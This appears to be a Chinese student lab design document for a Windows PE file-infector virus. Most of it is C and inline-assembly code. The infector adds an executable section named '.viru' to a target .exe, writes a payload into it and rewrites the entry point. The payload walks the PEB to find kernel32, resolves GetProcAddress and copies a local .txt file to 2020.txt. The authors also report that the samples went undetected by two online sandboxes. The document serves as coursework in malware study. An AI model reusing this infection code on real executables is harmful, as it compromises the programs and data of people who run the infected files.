# Infect设计文档

## 1.Infect功能说明

### 1.1目标

将同目录下.txt文件的内容复制到另一个位置，且文件名为本组吴定远同学的学号。

### 1.2功能

　　本次实验中，病毒由work1与work2两部分代码组成。其中work1对应病毒载荷，work2对应病毒的感染模块。下面对两者的功能进行详细说明

#### work 1

* 首先通过TEB动态获取KernalBase32.dll的基地址
* 然后在KernalBase32的进程空间进行搜索，寻找到GetProcAddress()函数的函数地址
* 寻找 .txt文件，并将内容其拷贝到 “ 2020.txt ”文件中

#### work2

* 获取PE文件的dos头与PE头，跳转到最后一个节表项
* 将病毒载荷保存到最后一个节表项中
* 修改PE的程序入口点

## 2.“传染”功能的设计与实现

### 	2.1 新增病毒载荷节表项

　　该模块通过PE头，在节表项的末尾新增病毒节的Section Header。

```c
DWORD_PTR addsection(char* file)
{

    IMAGE_DOS_HEADER image_dos_header;
    IMAGE_NT_HEADERS image_nt_headers;
    IMAGE_SECTION_HEADER image_section_header; // 用于存储新加的节表项
    IMAGE_SECTION_HEADER old_section;          // 存储旧的节表项
    int num_section = 0;
    //    byte sec[8]=".txt";
    
    FILE* h;
    h = fopen(file, "rb+");
    fseek(h, 0, SEEK_SET);
    fread(&image_dos_header, sizeof(IMAGE_DOS_HEADER), 1, h);
    //printf("%x\n", image_dos_header.e_lfarlc);
    fseek(h, image_dos_header.e_lfanew, SEEK_SET);
    fread(&image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, h); //PE头
    //printf("%x\n", image_nt_headers.OptionalHeader);
    //printf("%d", sizeof(IMAGE_NT_HEADERS));
    //for (int a = 0; a <= 15; a++)
    //  printf("%x,%x\n", image_nt_headers.OptionalHeader.DataDirectory[a].VirtualAddress, image_nt_headers.OptionalHeader.DataDirectory[a].Size);

    num_section = image_nt_headers.FileHeader.NumberOfSections;
    fseek(h, image_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (num_section - 1) * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);// 跳到最后一个节表项
    fread(&old_section, sizeof(IMAGE_SECTION_HEADER), 1, h);  // 存储最后一个节表项到old_section

    image_nt_headers.FileHeader.NumberOfSections += 1;
    image_section_header.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
    image_section_header.Misc.VirtualSize = image_nt_headers.OptionalHeader.SectionAlignment;
    //bool x=true;
    int n;
    for (int n = 1; true; n++) {
        if (image_nt_headers.OptionalHeader.FileAlignment * n > 400) break; //节大小
    }
    image_section_header.SizeOfRawData = image_nt_headers.OptionalHeader.FileAlignment * 5;
    strcpy((char*)image_section_header.Name, ".viru");
    image_section_header.PointerToRawData = 0x2000;//alig(old_section.PointerToRawData + old_section.SizeOfRawData, image_nt_headers.OptionalHeader.FileAlignment);
    image_section_header.VirtualAddress = 0x6000;//alig(old_section.VirtualAddress + old_section.SizeOfRawData, image_nt_headers.OptionalHeader.SectionAlignment);
    fseek(h, image_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + num_section * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);
    fwrite(&image_section_header, sizeof(IMAGE_SECTION_HEADER), 1, h);


    image_nt_headers.OptionalHeader.SizeOfImage = 0x7000;//alig(image_section_header.VirtualAddress + image_section_header.SizeOfRawData, image_nt_headers.OptionalHeader.SectionAlignment);
    image_nt_headers.OptionalHeader.DataDirectory[11].VirtualAddress = 0;
    image_nt_headers.OptionalHeader.DataDirectory[11].Size = 0;
    fseek(h, image_dos_header.e_lfanew, SEEK_SET);
    fwrite(&image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, h);

    fseek(h, image_section_header.PointerToRawData, SEEK_SET);
    byte* s = (byte*)malloc(image_section_header.SizeOfRawData);
    ZeroMemory((void*)s, image_section_header.SizeOfRawData);
    fwrite(s, image_section_header.SizeOfRawData, 1, h);

    DWORD fva = image_section_header.Misc.VirtualSize + image_section_header.PointerToRawData;
    fclose(h);
    printf("%x", fva);
    return fva;

}
```

### 2.2 改变PE文件的程序入口点

　　该模块获取PE文件的dos头与PE头，并修改源文件的AddressOfEntryPoint，同时返回原地址与新地址之间的偏移量。

```c
DWORD changeentry(DWORD entry, char* target) {
    FILE* fp = fopen(target, "rb+");
    if (fp == NULL) {
        //printf("can not open file");
        return 0;
    }
    // 获取dos头
    IMAGE_DOS_HEADER dosHeader;
    fread(&dosHeader, 1, sizeof(dosHeader), fp);
    // 获取PE头
    DWORD offsetPeHeader = dosHeader.e_lfanew;
    fseek(fp, offsetPeHeader, SEEK_SET);
    IMAGE_NT_HEADERS ntHeader;
    fread(&ntHeader, 1, sizeof ntHeader, fp);
    fseek(fp, offsetPeHeader, SEEK_SET);
    DWORD old_entry;
    old_entry = ntHeader.OptionalHeader.AddressOfEntryPoint;
    ntHeader.OptionalHeader.AddressOfEntryPoint = entry;
    DWORD offset;
    offset = entry - old_entry;
    fwrite(&ntHeader, sizeof(ntHeader), 1, fp);
    fclose(fp);
    return offset;
}
```

### 2.3 病毒载荷模块

　　该模块将病毒载荷写入感染文件中。

```c
void shellcode(DWORD fva, char* file) {
    FILE* fp;
    IMAGE_DOS_HEADER image_dos_header;
    IMAGE_NT_HEADERS image_nt_headers;

    fp = fopen(file, "rb+");
    fseek(fp, 0, SEEK_SET);
    fread(&image_dos_header, sizeof(IMAGE_DOS_HEADER), 1, fp);
    fseek(fp, image_dos_header.e_lfanew, SEEK_SET);
    fread(&image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, fp); //PE头


    DWORD oldEntry = image_nt_headers.OptionalHeader.AddressOfEntryPoint;//+0x21

    DWORD start, end;
    _asm
    {
        //病毒代码块 
    //数据区
        mov eax, begin1
        mov start, eax;
        mov eax, end1

            mov end, eax;
        jmp end2
            begin1 :

        call A
            A :
        pop edi
            //可能会有一定偏移
            sub edi, 5
            //mov[edi - 4], edi;//标记当前的地址

            push eax

            mov eax, fs: [30h]//动态获取image_base，加上旧的AddressOfEntryPoint后就得到要跳转的位置
            mov eax, [eax + 0x0c]; //LDR
        mov eax, [eax + 0x0c]

            mov eax, [eax + 0x18]//节点偏移0x18就是exe在内存中的加载基址
            //mov eax,0x40000
            add eax, [edi + 0x21]//oldentry
            mov edi, eax
            pop eax
            jmp edi

            end1 :
        nop
            end2 :
        nop


    }
    fseek(fp, fva, SEEK_SET);

    char* filein = (char*)"work1.exe[.wdy]";
    FILE* infile;
    infile = fopen(filein, "rb+");
    BYTE buf = 0;
    int count = 0;
    int rc;
    while ((rc = fread(&buf, 1, 1, infile)) != 0)
    {
        if (count >= 1440 && count <= 2806)
        {
            fwrite(&buf, 1, 1, fp);
        }
        count++;
        //fwrite(&buf, 1, 1, fp);
    }
    fclose(infile);
    fwrite((char*)start, end - start, 1, fp);//在病毒载荷最后跳回原本的entrypoint
    fwrite((char*)&oldEntry, 4, 1, fp);
    fclose(fp);
}
```

### 2.4 感染模块主程序 

　　本次实验中我们编写了hello.exe文件，作为被感染程序。如果需要更改被感染程序，可以在主函数中调整。

```c
int main()
{
    char* file = (char*)"hello.exe";
    DWORD fva = addsection(file);
    shellcode(0x2000, file);
    DWORD entry = 0x6000;
    changeentry(entry, file);
    return 0;
}
```



## 3.病毒载荷代码的设计、实现与提取

### 3.1 遍历寻找kernel132模块

```c
	__asm {
		mov	eax, fs: [0x30]			//指向peb
		mov	eax, [eax + 0x0c]		//peb->ldr
		add eax, 0x0c				//InLoadOrderModuleList
		mov pBeg, eax				//pBeg指向第一个模块结构
		mov eax, [eax]
		mov pPLD, eax				//pPLD指向第二个模块结构
	}
	while (pPLD != pBeg) {		//循环模块双向链表
		pLast = (WORD*)pPLD->BaseDllName.Buffer;		//指向模块名字的指针
		pFirst = (WORD*)szKernel32;
		while (*pFirst && (*pFirst == *pLast || *pFirst + 0x20 == *pLast))		//不相同或者结尾就停下
			pFirst++, pLast++;
		if (*pFirst == *pLast) {					//说明是结尾了，比较正确
			dwKernel32Base = (DWORD)pPLD->DllBase;
			break;
		}
		pPLD = (LDR_DATA_TABLE_ENTRY*)pPLD->InLoadOrderLinks.Flink;		//否则就不是所找的dll，下一轮循环
	}
```

### 3.2 通过kernel132的导出表找打getprocaddress的函数地址

```c
    //pPLD指向kernel32模块结构了,要遍历kernel32的导出表找到getprocaddress
	IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)dwKernel32Base;
	IMAGE_NT_HEADERS* pINtH = (IMAGE_NT_HEADERS*)((DWORD)dwKernel32Base + pDosHeader->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* pIED = (IMAGE_EXPORT_DIRECTORY*)((DWORD)dwKernel32Base + pINtH->OptionalHeader.DataDirectory[0].VirtualAddress);//导出表va
	DWORD* pAddOfFun_Raw = (DWORD*)((DWORD)dwKernel32Base + pIED->AddressOfFunctions);		//函数地址表，序号最大减去最小
	DWORD* pAddOfName_Raw = (DWORD*)((DWORD)dwKernel32Base + pIED->AddressOfNames);	//以名字导出函数，字母排序的
	WORD* pAddOfOrd_Raw = (WORD*)((DWORD)dwKernel32Base + pIED->AddressOfNameOrdinals);//每个项占两个字节,和名字表个数一样
	//找函数地址顺序，函数名字表中得到索引，根据索引在序号表找到索引，根据索引找地址表中地址
	//序号直接减去序号base在地址表找地址
	DWORD dwCnt = 0;//函数在函数表中索引
	char* pFinded = NULL, * pSrc = szGetProcAddress;//要比对函数
	for (; dwCnt < pIED->NumberOfNames; dwCnt++) {//所有函数名字
		pFinded = (char*)((DWORD)dwKernel32Base + pAddOfName_Raw[dwCnt]);
		while (*pFinded && *pFinded == *pSrc) {
			pFinded++, pSrc++;
		}
		if (*pFinded == *pSrc) {//找到了
			pGetProcAddress = (PGETPROCADDRESS)((DWORD)dwKernel32Base + pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]]);
			break;
		}
		pSrc = szGetProcAddress;
	}
	//找到了getprocaddress
```

### 3.3 寻找当前目录中的txt文件，并将内容拷贝

```c
	pLoadLibraryA = (PLOADLIBRARYA)pGetProcAddress((HMODULE)dwKernel32Base, szLoadLibraryA);


	pFindFirstFileA = (PFINDFIRSTFILEA)pGetProcAddress((HMODULE)dwKernel32Base, szFindFirstFileA);
	pCopyFile = (PCOPYFILE)pGetProcAddress((HMODULE)dwKernel32Base, szCopyFile);
	pFindClose = (PFINDCLOSE)pGetProcAddress((HMODULE)dwKernel32Base, szFindClose);

	WIN32_FIND_DATAA fileData;
	char fileName[] = { '*', '.', 't', 'x', 't', 0 };
	char newPath[] = { '2', '0', '2', '0', '.', 't', 'x', 't', 0 };
	HANDLE hSearchFile = pFindFirstFileA(fileName, &fileData);
	pCopyFile(fileData.cFileName, newPath, FALSE);
	pFindClose(hSearchFile);
```



## 4.调试说明

### 4.1 病毒载荷调试

* 在当前目录中创建任意txt格式文件
* 运行work1.exe
* 可以观察到文件目录中出现2020.txt
* 该txt文件的内容和创建的文件中一致

### 4.2 感染模块调试

* 创建被感染程序（我们提供了hello.exe用作测试，更换其它程序可以在主函数修改对应的程序名）
* 运行work2.exe
* 在当前目录中创建任意txt格式文件
* 运行hello.exe
* 可以观察到文件目录中出现2020.txt
* 该txt文件的内容和创建的文件中一致



## 5.实验的思考和建议

　　本实验中，我们团队编写了一个PE病毒的感染模块和载荷模块，使用了C语言+汇编语言的编写方法。实验中我们通过在PE文件的最后新加入一个节来插入病毒代码，并通过kernel32、导出表，找到目标函数VA，最终实现拷贝文件的功能。

　　然而，这样加入病毒节的方式是不完善的，因为不是所有的PE文件都会预留一个空白的节表项。我们考虑过在中间插入一个新的节表项或者将代码插入到原来节的空闲空间中，然而前者需要对所有节进行偏移，后者需要将病毒代码拆分。我们考虑是否可以将病毒代码直接附在最后的一个节的末尾和原来最后一个节的内容合并起来变成一个大的节，这个无须添加新的节表项，不存在节的偏移问题。这或许是我们未来改进的方向。

　　另外，我们将病毒文件以及感染后的文件上传到**腾讯哈勃分析系统**与**奇安信情报沙箱**进行检测（见附上的检测结果图片），均未发现风险。可见新型的PE病毒还是具有一定的风险性。

## 6.贡献说明

* 吴定远和甘哲骏负责本次实验代码的编写
* 李欣垚负责本次实验代码的测试以及文档编写